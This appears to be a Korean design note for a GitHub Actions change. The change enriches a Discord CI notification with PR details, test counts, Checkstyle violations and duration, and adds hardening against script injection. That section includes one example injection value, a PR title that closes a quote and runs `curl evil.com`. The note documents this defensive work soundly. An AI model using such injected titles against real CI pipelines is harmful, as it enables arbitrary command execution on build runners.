# #22 CI Discord 알림에 PR 컨텍스트/테스트 요약/포맷 개선

관련 이슈: https://github.com/GBSW-ReMake/GONE-server-V1/issues/22

## 개요/목적
`.github/workflows/ci.yml`의 Discord 알림(`DISCORD_CI_WEBHOOK`)이 지금은 브랜치명/실행자/링크
세 가지만 담고 있어, 실제로 무슨 PR에서 무엇이 실패/성공했는지 알림만 보고는 알기 어렵다.
코드 변경은 없고 워크플로우 yaml만 수정한다.

## 변경 내용

### 1. PR 컨텍스트
`pull_request` 이벤트일 때는 `github.event.pull_request.*`에서, `push` 이벤트일 때는
`github.event.head_commit.*`에서 값을 가져온다(하나의 워크플로우가 두 이벤트 모두에서
돌기 때문에 조건 분기 필요).

- PR 번호/제목/URL
- 커밋 SHA(짧게 7자리), 커밋 메시지 첫 줄
- 실행자 GitHub 아바타(`https://github.com/{actor}.png`)를 embed의 `author.icon_url`로

### 2. 테스트 결과 요약
`build/test-results/test/*.xml`(JUnit XML)을 파싱해 통과/실패/스킵 개수를 뽑는다. 별도
액션(`mikepenz/action-junit-report` 등) 도입 대신, xml의 `<testsuite ... tests="" failures=""
skipped="">` 속성을 셸에서 `grep`/`xmllint`로 합산하는 가벼운 방식을 쓴다(새 의존성 추가 최소화).
결과는 `$GITHUB_ENV`에 담아 이후 Discord 알림 스텝에서 사용.

### 3. Checkstyle 위반 건수
`checkstyle` job 실패 시 `build/reports/checkstyle/main.xml`/`test.xml`에서 `<error` 태그
개수를 세어 위반 건수로 표시.

### 4. Discord embed `fields` 포맷
지금처럼 `description` 한 줄에 다 담지 않고, `fields` 배열로 분리:

```json
{
  "embeds": [{
    "title": "✅ CI 성공",
    "color": 65280,
    "author": { "name": "${{ github.actor }}", "icon_url": "https://github.com/${{ github.actor }}.png" },
    "fields": [
      { "name": "PR", "value": "[#12 로그인 개편](PR_URL)", "inline": true },
      { "name": "커밋", "value": "`${SHORT_SHA}` 커밋 메시지 첫 줄", "inline": true },
      { "name": "테스트", "value": "142 passed, 0 failed, 0 skipped", "inline": true },
      { "name": "소요 시간", "value": "2m 34s", "inline": true }
    ],
    "url": "${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}",
    "timestamp": "${{ 알림 발송 시각 }}"
  }]
}
```

### 소요 시간 측정
job 시작 시각을 스텝에서 `date +%s`로 `$GITHUB_ENV`에 저장해두고, 알림 스텝에서 다시
`date +%s`를 찍어 차이를 계산한다(Job 전체 wall-clock과는 약간 다를 수 있음 — Checkout 이후
시점부터 측정).

### 5. 스크립트 인젝션 방지 (구현 중 추가로 반영)
PR 제목/커밋 메시지는 외부(기여자)가 자유롭게 입력하는 값이다. 기존 코드는 `github.actor`
정도만 `${{ }}`로 `run:` 스크립트 본문에 직접 끼워 넣었는데, 이번에 추가하는 PR 제목/커밋
메시지는 훨씬 다양한 특수문자(따옴표, 백틱, `$()` 등)가 들어올 가능성이 높아 같은 방식을 쓰면
위험하다 — `${{ github.event.pull_request.title }}`을 스크립트 본문에 직접 splice하면, 예를
들어 PR 제목이 `` "; curl evil.com; echo " ``처럼 구성된 경우 러너에서 임의 명령이 실행될 수
있다(GitHub이 공식적으로 경고하는 스크립트 인젝션 패턴).

- 모든 `github.event.*` 값은 `run:` 본문에 직접 넣지 않고 스텝의 `env:` 블록으로만 전달한다.
  `env:`로 전달된 값은 셸 변수 "값"으로만 취급되고 스크립트로 재해석되지 않는다.
- Discord로 보낼 JSON은 문자열을 직접 이어붙이지 않고 `jq -n --arg ...`로 생성한다 — 값에
  큰따옴표가 섞여도 JSON이 깨지지 않고, 셸 명령으로도 해석되지 않는다(`ubuntu-22.04` 러너에
  `jq` 기본 설치되어 있어 추가 설치 불필요).
- 위 방식으로 따옴표/백틱/`$(...)`가 섞인 PR 제목·커밋 메시지를 넣어 로컬에서 payload 생성을
  검증함(QA 문서 참고).

## 영향 받는 기존 코드/테스트
- `.github/workflows/ci.yml`만 수정(애플리케이션 코드 변경 없음)
- 테스트 대상 아님(워크플로우 자체는 실제 PR/push로만 검증 가능) — 다만 워크플로우 안의 셸
  로직(테스트 집계, JSON 생성)은 로컬에서 동일한 스크립트를 더미 데이터로 실행해 검증함.

## 리스크 및 고려사항
- **JUnit XML 파싱 방식**: 전용 액션을 안 쓰고 셸 스크립트로 직접 파싱하면 나중에 리포트
  포맷이 바뀌면(Gradle 버전 업 등) 깨질 수 있음 — 다만 지금은 새 의존성/권한(액션이 PR에
  코멘트를 다는 권한 등)을 추가하지 않는 쪽을 택함.
- **`push`와 `pull_request` 이벤트 조건 분기**: 기존엔 신경 안 써도 됐는데(브랜치명만 썼으므로),
  PR 컨텍스트를 넣으려면 이벤트 타입별로 다른 컨텍스트 변수를 써야 해서 스텝이 조금 복잡해짐.
- **소요 시간 측정 정밀도**: Checkout 이전 러너 대기 시간은 포함 안 됨 — 대략적인 참고용.
- **스크립트 인젝션**: 위 "5. 스크립트 인젝션 방지" 참고 — `env:` + `jq`로 대응.
